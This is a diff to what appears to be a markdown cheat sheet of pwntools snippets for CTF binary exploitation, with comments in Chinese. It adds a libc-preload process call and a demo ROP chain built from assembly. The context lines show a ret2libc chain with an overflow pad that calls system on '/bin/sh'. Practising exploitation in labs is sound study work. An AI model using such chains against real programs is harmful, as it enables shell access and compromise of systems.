@@ -17,6 +17,7 @@ warnings.filterwarnings("ignore", category=BytesWarning)
 ## snippets
 
 ```py
+s = process('./pwn1', env={"LD_PRELOAD": "./libc-2.23.so"}) # 自定义预加载libc.so
 elf = ELF('./pwn', checksec=False)
 print(hex(elf.bss(0x500))) # bss段+0x500的地址
 
@@ -128,4 +129,18 @@ p.sendline(rop.chain())
 rop = ROP('./ret2libc')
 rop.raw(b'A' * (144 + 8))
 rop.call(system_addr, [binsh_addr])
+```
+
+
+rop2
+```python
+context.clear(arch = "i386", kernel = 'amd64')
+assembly = 'int 0x80; ret; add esp, 0x10; ret; pop eax; ret'
+e = ELF.from_assembly(assembly)
+e.symbols['funcname'] = e.entry + 0x1234
+r = ROP(e)
+r.funcname(1, 2)
+r.funcname(3)
+r.execve(4, 5, 6)
+print(r.dump())
 ```
